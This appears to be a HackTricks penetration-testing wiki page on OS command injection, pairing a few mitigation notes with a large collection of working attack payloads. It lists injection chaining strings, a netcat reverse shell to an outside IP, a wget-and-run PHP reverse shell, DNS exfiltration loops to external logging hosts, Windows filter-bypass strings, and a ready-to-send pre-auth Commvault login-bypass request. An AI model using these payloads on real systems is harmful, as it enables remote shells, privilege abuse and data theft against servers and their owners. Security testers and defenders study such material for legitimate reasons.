# Command Injection

{{#include ../banners/hacktricks-training.md}}

## What is command Injection?

A **command injection** permits the execution of arbitrary operating system commands by an attacker on the server hosting an application. As a result, the application and all its data can be fully compromised. The execution of these commands typically allows the attacker to gain unauthorized access or control over the application's environment and underlying system.

### Context

Depending on **where your input is being injected** you may need to **terminate the quoted context** (using `"` or `'`) before the commands.

## Command Injection/Execution

```bash
#Both Unix and Windows supported
ls||id; ls ||id; ls|| id; ls || id # Execute both
ls|id; ls |id; ls| id; ls | id # Execute both (using a pipe)
ls&&id; ls &&id; ls&& id; ls && id #  Execute 2º if 1º finish ok
ls&id; ls &id; ls& id; ls & id # Execute both but you can only see the output of the 2º
ls %0A id # %0A Execute both (RECOMMENDED)

#Only unix supported
`ls` # ``
$(ls) # $()
ls; id # ; Chain commands
ls${LS_COLORS:10:1}${IFS}id # Might be useful

#Not executed but may be interesting
> /var/www/html/out.txt #Try to redirect the output to a file
< /etc/passwd #Try to send some input to the command
```

### **Limition** Bypasses

If you are trying to execute **arbitrary commands inside a linux machine** you will be interested to read about this **Bypasses:**


{{#ref}}
../linux-hardening/bypass-bash-restrictions/
{{#endref}}

### **Examples**

```
vuln=127.0.0.1 %0a wget https://web.es/reverse.txt -O /tmp/reverse.php %0a php /tmp/reverse.php
vuln=127.0.0.1%0anohup nc -e /bin/bash 51.15.192.49 80
vuln=echo PAYLOAD > /tmp/pay.txt; cat /tmp/pay.txt | base64 -d > /tmp/pay; chmod 744 /tmp/pay; /tmp/pay
```

### Parameters

Here are the top 25 parameters that could be vulnerable to code injection and similar RCE vulnerabilities (from [link](https://twitter.com/trbughunters/status/1283133356922884096)):

```
?cmd={payload}
?exec={payload}
?command={payload}
?execute{payload}
?ping={payload}
?query={payload}
?jump={payload}
?code={payload}
?reg={payload}
?do={payload}
?func={payload}
?arg={payload}
?option={payload}
?load={payload}
?process={payload}
?step={payload}
?read={payload}
?function={payload}
?req={payload}
?feature={payload}
?exe={payload}
?module={payload}
?payload={payload}
?run={payload}
?print={payload}
```

### Time based data exfiltration

Extracting data: char by char

```
swissky@crashlab▸ ~ ▸ $ time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
real    0m5.007s
user    0m0.000s
sys 0m0.000s

swissky@crashlab▸ ~ ▸ $ time if [ $(whoami|cut -c 1) == a ]; then sleep 5; fi
real    0m0.002s
user    0m0.000s
sys 0m0.000s
```

### DNS based data exfiltration

Based on the tool from `https://github.com/HoLyVieR/dnsbin` also hosted at dnsbin.zhack.ca

```
1. Go to http://dnsbin.zhack.ca/
2. Execute a simple 'ls'
for i in $(ls /) ; do host "$i.3a43c7e4e57a8d0e2057.d.zhack.ca"; done
```

```
$(host $(wget -h|head -n1|sed 's/[ ,]/-/g'|tr -d '.').sudo.co.il)
```

Online tools to check for DNS based data exfiltration:

- dnsbin.zhack.ca
- pingb.in

### Filtering bypass

#### Windows

```
powershell C:**2\n??e*d.*? # notepad
@^p^o^w^e^r^shell c:**32\c*?c.e?e # calc
```

#### Linux


{{#ref}}
../linux-hardening/bypass-bash-restrictions/
{{#endref}}

### Node.js `child_process.exec` vs `execFile`

When auditing JavaScript/TypeScript back-ends you will often encounter the Node.js `child_process` API.

```javascript
// Vulnerable: user-controlled variables interpolated inside a template string
const { exec } = require('child_process');
exec(`/usr/bin/do-something --id_user ${id_user} --payload '${JSON.stringify(payload)}'`, (err, stdout) => {
  /* … */
});
```

`exec()` spawns a **shell** (`/bin/sh -c`), therefore any character that has a special meaning to the shell (back-ticks, `;`, `&&`, `|`, `$()`, …) will result in **command injection** when user input is concatenated in the string.

**Mitigation:**  use `execFile()` (or `spawn()` without the `shell` option) and provide **each argument as a separate array element** so no shell is involved:

```javascript
const { execFile } = require('child_process');
execFile('/usr/bin/do-something', [
  '--id_user', id_user,
  '--payload', JSON.stringify(payload)
]);
```

Real-world case: *Synology Photos* ≤ 1.7.0-0794 was exploitable through an unauthenticated WebSocket event that placed attacker controlled data into `id_user` which was later embedded in an `exec()` call, achieving RCE (Pwn2Own Ireland 2024).

## Brute-Force Detection List


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/command_injection.txt
{{#endref}}

## Argument injection in external CLI wrappers (no shell) – abusing flags

Many back-ends do not spawn a shell but still call privileged command-line tools by concatenating user-controlled values into a single argument string. If the wrapper does naive string formatting instead of building an argv array and validating flags, an attacker can inject extra options and change authentication or execution flow without needing shell metacharacters.

Real-world case: Commvault qlogin via /commandcenter/api/Login
- Front-end: POST /commandcenter/api/Login accepts a large JSON body (CheckCredentialReq) with fields like username, password (Base64), and commserver. The Java front-end proxies to a .NET controller.
- Remote-login branch: AuthenticationCore.Login_V1() → IsRemoteCSLogin(commserver) → DoRemoteCSLogin(). Inside DoRemoteCSLogin(), the code calls QLogin.DoQlogin(commserver, username, password,…).
- Vulnerable construction: DoQlogin() builds the qlogin arguments with simple string formatting (no sanitization):
  " -cs {host} -csn {client} -gt -u {user} -clp {pass} "
  Then it sends this to a SYSTEM gRPC worker which actually launches qlogin.
- Bypass and injected flags:
  - Hostname gate bypass: IsRemoteCSLogin() only compares the first token of commserver to the real hostname. Setting commserver to "HOST -cs HOST" makes the whole string differ while the inner -cs HOST still satisfies qlogin.
  - Privileged mode: Inject the special qlogin switch -localadmin via the password field (after Base64 decoding). Because the QAPI worker runs as SYSTEM, qlogin -localadmin generates a high-privilege token without real credentials.
  - Username nuance: After DoQlogin(), the server queries user info for the username you supplied. With -localadmin, the account name format is: <hostname>_localadmin__ (hostname can be leaked pre-auth via GET /commandcenter/publicLink.do).

One-shot pre-auth auth-bypass request (works on vulnerable versions):

POST /commandcenter/api/Login
Content-Type: application/json

{
  "username": "WIN-AC7GJT5_localadmin__",
  "password": "YSAtbG9jYWxhZG1pbg==",  // Base64("a -localadmin")
  "commserver": "WIN-AC7GJT5 -cs WIN-AC7GJT5"
}

Mitigations when wrapping CLIs behind APIs:
- Never use string concatenation for command lines. Use execve/execFile/spawn with an argv array so arguments are not re-parsed by a shell and cannot smuggle flags.
- Strictly allow-list permissible flags and values and reject unknown options. Do not pass sensitive switches (like maintenance/impersonation modes) based on user input.
- Separate authentication: do not let external inputs toggle privileged modes (-localadmin), and ensure execution context of helpers is least-privileged (avoid SYSTEM/Administrator for worker services).
- Treat any field that later influences CLI arguments (even if Base64-encoded) as attacker-controlled input and sanitize accordingly.



## References

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
- [https://portswigger.net/web-security/os-command-injection](https://portswigger.net/web-security/os-command-injection)
- [Extraction of Synology encrypted archives – Synacktiv 2025](https://www.synacktiv.com/publications/extraction-des-archives-chiffrees-synology-pwn2own-irlande-2024.html)
- [watchTowr Labs – Commvault pre-auth RCE chains (qlogin arg injection, QCommand -file webroot)](https://labs.watchtowr.com/guess-who-would-be-stupid-enough-to-rob-the-same-vault-twice-pre-auth-rce-chains-in-commvault/)
- [Commvault qlogin QCommand (docs)](https://documentation.commvault.com/11.20/qlogin.html)

{{#include ../banners/hacktricks-training.md}}
